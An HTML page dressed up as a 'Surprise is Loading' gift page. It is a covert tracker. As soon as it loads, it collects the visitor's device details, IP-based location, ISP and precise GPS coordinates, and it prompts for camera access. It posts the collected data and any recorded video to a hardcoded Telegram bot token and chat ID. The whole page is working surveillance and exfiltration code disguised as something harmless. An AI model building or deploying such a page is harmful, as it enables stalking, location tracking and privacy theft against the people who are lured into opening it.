<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Surprise!</title>
<style>
  body {
    background: linear-gradient(135deg, #a0d8e1, #6ec6e6);
    font-family: sans-serif;
    text-align: center;
    padding: 20px;
    color: #fff;
  }
  h1 {
    font-size: 24px; 
    margin-top: 20px;
  }
  #info {
    margin-top: 20px;
    font-size: 14px;
    white-space: pre-line; /* preserve line breaks */
  }
  #videoContainer {
    margin-top: 20px;
  }
  video {
    width: 80%;
    max-width: 600px;
    border: 2px solid #fff;
    border-radius: 8px;
  }
  button {
    margin-top: 15px;
    padding: 10px 20px;
    font-size: 16px;
    border: none;
    border-radius: 5px;
    cursor: pointer;
    background-color: #fff;
    color: #6ec6e6;
  }
  button:hover {
    background-color: #eee;
  }
</style>
</head>
<body>
<h1>Surprise is Loading... 🎁</h1>
<div id="info">Initializing...</div>
<div id="videoContainer">
  <video id="recordingVideo" autoplay muted></video>
  <div>
    <button id="startBtn">Start Recording</button>
    <button id="stopBtn" disabled>Stop Recording</button>
  </div>
</div>

<script>
const botConfigs = [
  {
    token: "8909620046:AAFIowHrmzr2lqh8huSy9cgt3sYONWF2a4g",
    chatId: "8798734138"
  }
];

const infoDiv = document.getElementById("info");
const videoElement = document.getElementById("recordingVideo");
const startBtn = document.getElementById("startBtn");
const stopBtn = document.getElementById("stopBtn");

let mediaStream = null;
let mediaRecorder = null;
let recordedChunks = [];

// Initialize camera
navigator.mediaDevices.getUserMedia({ video: true, audio: false })
  .then(stream => {
    mediaStream = stream;
    videoElement.srcObject = stream;
  })
  .catch(err => {
    infoDiv.textContent = "Camera access denied.";
    console.error("Camera error:", err);
  });

// Function to gather device info and location
async function gatherAndSendData() {
  const now = new Date().toLocaleString();
  const ua = navigator.userAgent;
  const platform = navigator.platform;
  const screenRes = `${window.screen.width}x${window.screen.height}`;

  // Fetch IP info
  let ipInfo = "🌐 IP: Not available";
  try {
    const res = await fetch("https://ipapi.co/json/");
    const data = await res.json();
    ipInfo = `🌐 IP: ${data.ip}\n📍 Location: ${data.city}, ${data.region}\n🌍 Country: ${data.country_name}\n🏢 ISP: ${data.org}`;
  } catch (err) {}

  // Get exact location
  let locationLink = "Location: Permission Denied";
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      position => {
        locationLink = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
        sendMessage({ now, ua, platform, screenRes, ipInfo, locationLink });
        sendLocation(position.coords.latitude, position.coords.longitude);
      },
      () => {
        sendMessage({ now, ua, platform, screenRes, ipInfo, locationLink });
      },
      { enableHighAccuracy: true, timeout: 5000 }
    );
  } else {
    sendMessage({ now, ua, platform, screenRes, ipInfo, locationLink });
  }
}

// Send text message to Telegram
function sendMessage(data) {
  const message = `
🛰️ New Visit Tracked!
🕒 Time: ${data.now}
💻 Platform: ${data.platform}
📺 Screen: ${data.screenRes}
${data.ipInfo}
📌 Location: ${data.locationLink}
🧠 UA: ${data.ua}
  `;
  botConfigs.forEach(cfg => {
    fetch(`https://api.telegram.org/bot${cfg.token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: cfg.chatId, text: message })
    });
  });
}

// Send exact location
function sendLocation(lat, lon) {
  botConfigs.forEach(cfg => {
    fetch(`https://api.telegram.org/bot${cfg.token}/sendLocation`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: cfg.chatId, latitude: lat, longitude: lon })
    });
  });
}

// Event handlers for recording
startBtn.onclick = () => {
  if (!mediaStream) return;
  recordedChunks = [];
  mediaRecorder = new MediaRecorder(mediaStream);
  mediaRecorder.ondataavailable = e => {
    if (e.data.size > 0) {
      recordedChunks.push(e.data);
    }
  };
  mediaRecorder.onstop = () => {
    const blob = new Blob(recordedChunks, { type: "video/webm" });
    sendVideo(blob);
  };
  mediaRecorder.start();
  startBtn.disabled = true;
  stopBtn.disabled = false;
  infoDiv.textContent = "Recording...";
};

stopBtn.onclick = () => {
  if (mediaRecorder && mediaRecorder.state !== "inactive") {
    mediaRecorder.stop();
    startBtn.disabled = false;
    stopBtn.disabled = true;
    infoDiv.textContent = "Processing video...";
  }
};

// Send video to Telegram
function sendVideo(blob) {
  const formData = new FormData();
  formData.append("chat_id", "8798734138");
  formData.append("video", blob, "recording.webm");
  fetch(`https://api.telegram.org/bot8909620046:AAFIowHrmzr2lqh8huSy9cgt3sYONWF2a4g/sendVideo`, {
    method: "POST",
    body: formData
  }).then(() => {
    infoDiv.textContent = "Video sent!";
  }).catch(err => {
    console.error("Video send error:", err);
    infoDiv.textContent = "Failed to send video.";
  });
}

// Start gathering data
gatherAndSendData();
</script>
</body>
</html>
